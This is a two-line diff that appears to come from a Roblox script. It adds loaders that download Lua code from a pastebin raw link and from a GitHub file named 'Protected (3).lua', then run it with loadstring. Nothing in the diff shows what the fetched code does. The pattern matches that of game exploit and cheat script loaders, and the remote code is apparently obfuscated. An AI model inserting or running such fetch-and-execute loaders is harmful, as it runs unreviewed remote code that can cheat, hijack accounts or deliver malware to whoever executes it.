@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/mPU8ujvn", true))()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/manimcool21/Keyboard-FE/main/Protected%20(3).lua'),true))()
